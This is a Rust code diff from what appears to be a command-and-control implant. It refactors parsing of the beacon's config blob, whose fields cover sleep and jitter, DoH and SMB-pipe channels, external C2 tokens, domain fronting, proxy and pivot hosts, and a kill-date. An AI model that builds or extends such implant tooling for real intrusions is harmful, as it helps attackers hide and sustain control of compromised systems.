@@ -153,53 +153,9 @@ pub fn decode(blob: &[u8]) -> Result<Config, WireError> {
     let sleep_seconds = r.u32()?;
     let jitter_pct = r.u8()?;
     let use_tls_byte = r.u8()?;
-    // Channel dispatcher fields (spec-1). These are appended after the
-    // original fields. Old configs (build-time or unpatched .nyx_cfg) stop
-    // after use_tls — `remaining()==0` → default to Https-only with empty
-    // channel params. This is fully backward-compatible.
-    //
-    // implant-beacon-6: when the extended tail IS present but truncated, the
-    // field reads now FAIL (propagate `?`) instead of silently defaulting — a
-    // shape-mismatched blob must not silently zero the rotation/proxy/channel
-    // fields (or, in config_placeholder, the kill-date).
     let (primary_channel, fallback_bitmap, doh_resolver, smb_pipe_name, extc2_api_host, extc2_token,
          rotation_hosts, fronting_host, proxy_server, tcp_peer_host, tcp_peer_port) =
-        if r.remaining() > 0 {
-            let primary_channel = r.u8()?;
-            let fallback_bitmap = r.u8()?;
-            let doh_resolver = r.str()?;
-            let smb_pipe_name = r.str()?;
-            let extc2_api_host = r.str()?;
-            let extc2_token = r.str()?;
-            // spec-7 HTTP enhancement fields — further backward compat layer.
-            let (rotation_hosts, fronting_host, proxy_server) = if r.remaining() > 0 {
-                (r.str()?, r.str()?, r.str()?)
-            } else {
-                (String::new(), String::new(), String::new())
-            };
-            // spec-3 raw pivot fields — further backward compat layer.
-            let (tcp_peer_host, tcp_peer_port) = if r.remaining() > 0 {
-                (r.str()?, r.u16()?)
-            } else {
-                (String::new(), 0)
-            };
-            (
-                primary_channel,
-                fallback_bitmap,
-                doh_resolver,
-                smb_pipe_name,
-                extc2_api_host,
-                extc2_token,
-                rotation_hosts,
-                fronting_host,
-                proxy_server,
-                tcp_peer_host,
-                tcp_peer_port,
-            )
-        } else {
-            (0, 0, String::new(), String::new(), String::new(), String::new(),
-             String::new(), String::new(), String::new(), String::new(), 0)
-        };
+        decode_extended_tail(&mut r)?;
     Ok(Config {
         server_host,
         server_port,
@@ -220,4 +176,55 @@ pub fn decode(blob: &[u8]) -> Result<Config, WireError> {
         tcp_peer_host,
         tcp_peer_port,
     })
+}
+
+/// Parse the channel-dispatcher tail of the blob, defaulting to Https-only
+/// with empty channel params when the tail is absent.
+///
+/// Channel dispatcher fields (spec-1). These are appended after the
+/// original fields. Old configs (build-time or unpatched .nyx_cfg) stop
+/// after use_tls — `remaining()==0` → default to Https-only with empty
+/// channel params. This is fully backward-compatible.
+///
+/// implant-beacon-6: when the extended tail IS present but truncated, the
+/// field reads now FAIL (propagate `?`) instead of silently defaulting — a
+/// shape-mismatched blob must not silently zero the rotation/proxy/channel
+/// fields (or, in config_placeholder, the kill-date).
+fn decode_extended_tail(r: &mut Reader) -> Result<(u8, u8, String, String, String, String, String, String, String, String, u16), WireError> {
+    if r.remaining() > 0 {
+        let primary_channel = r.u8()?;
+        let fallback_bitmap = r.u8()?;
+        let doh_resolver = r.str()?;
+        let smb_pipe_name = r.str()?;
+        let extc2_api_host = r.str()?;
+        let extc2_token = r.str()?;
+        // spec-7 HTTP enhancement fields — further backward compat layer.
+        let (rotation_hosts, fronting_host, proxy_server) = if r.remaining() > 0 {
+            (r.str()?, r.str()?, r.str()?)
+        } else {
+            (String::new(), String::new(), String::new())
+        };
+        // spec-3 raw pivot fields — further backward compat layer.
+        let (tcp_peer_host, tcp_peer_port) = if r.remaining() > 0 {
+            (r.str()?, r.u16()?)
+        } else {
+            (String::new(), 0)
+        };
+        Ok((
+            primary_channel,
+            fallback_bitmap,
+            doh_resolver,
+            smb_pipe_name,
+            extc2_api_host,
+            extc2_token,
+            rotation_hosts,
+            fronting_host,
+            proxy_server,
+            tcp_peer_host,
+            tcp_peer_port,
+        ))
+    } else {
+        Ok((0, 0, String::new(), String::new(), String::new(), String::new(),
+            String::new(), String::new(), String::new(), String::new(), 0))
+    }
 }
